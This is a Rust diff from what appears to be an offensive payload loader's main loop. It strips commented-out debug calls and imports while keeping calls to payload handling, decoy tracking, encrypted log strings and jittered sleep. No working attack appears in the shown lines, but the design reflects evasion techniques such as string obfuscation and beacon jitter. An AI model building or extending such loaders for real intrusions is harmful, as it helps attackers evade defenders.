@@ -2,12 +2,8 @@ use crate::config::CCC;
 use crate::dataoperation::un_apply_all_dataoperations;
 use crate::dataoperation::DO;
 use crate::payload::PO;
-//use crate::payload_util::print_running_thread;
-//use crate::payload_util::print_runonce;
 use crate::payload_util::print_rundata;
 use crate::rundata::RunData;
-//use crate::loader::service_malleable::run_service_malleable;
-//use crate::loader::service_malleable::logservice;
 
 use cryptify;
 use cryptify::encrypt_string;
@@ -131,13 +127,6 @@ pub fn run_loader() {
             }
 
             info!("{}", encrypt_string!("[+] UPDATE config"));
-            //TODO si on file une copie
-            /* 
-            let mut running_payload: Vec<Payload> = vec![];
-            for t in &run_data.running_thread_payload {
-                running_payload.push(t.1.clone());
-            }
-            */
             let run_data_copy: RunData =  run_data.clone();
 
             //TODO lui filer une copie du run data plutôt, mais pas prioritaire. comme ça il pourra aussi avoir les decoy qui run
@@ -156,12 +145,6 @@ pub fn run_loader() {
         }
 
         print_rundata(&mut run_data);
-
-        //DEBUG sale sur service SCM control
-        //logservice("avant run_service_malleable");
-        //run_service_malleable();
-        //logservice("after run_service_malleable");
-    
 
         //TODO wait all thread to finish -> new option
         config.sleep_and_jitt();
